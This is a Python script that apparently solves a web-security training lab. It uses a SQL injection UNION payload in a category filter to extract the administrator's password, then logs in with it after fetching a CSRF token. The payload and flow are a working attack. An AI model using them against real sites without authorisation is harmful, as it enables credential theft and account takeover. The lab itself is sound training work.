"""
Lab: SQL injection UNION attack, retrieving data from other tables

Objetivo:
Explorar uma SQL Injection UNION para extrair a senha do usuário administrator e logar em sua conta.
"""

import requests
from bs4 import BeautifulSoup as bs

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

PAYLOAD = "' UNION SELECT username,password FROM users WHERE username='administrator'--"

target_url = input("URL do laboratório: ").rstrip("/")

session = requests.Session()

response = session.get(
    f"{target_url}/filter",
    params={"category": f"Pets{PAYLOAD}"}
)

admin = bs(response.text,"html.parser").find("th", string="administrator")
password = admin.find_next("td").text

login_page = session.get(f"{target_url}/login")

csrf_token = bs(login_page.text, "html.parser").find(
    "input", {"name": "csrf"}
)["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

r = session.post(
    f"{target_url}/login",
    data=data
)

check = session.get(target_url)

if "Congratulations" in check.text:
    print(f"{GREEN}[+] Vulnerabilidade explorada.{RESET}")
else:
    print(f"{RED}[-] Exploração não confirmada.{RESET}")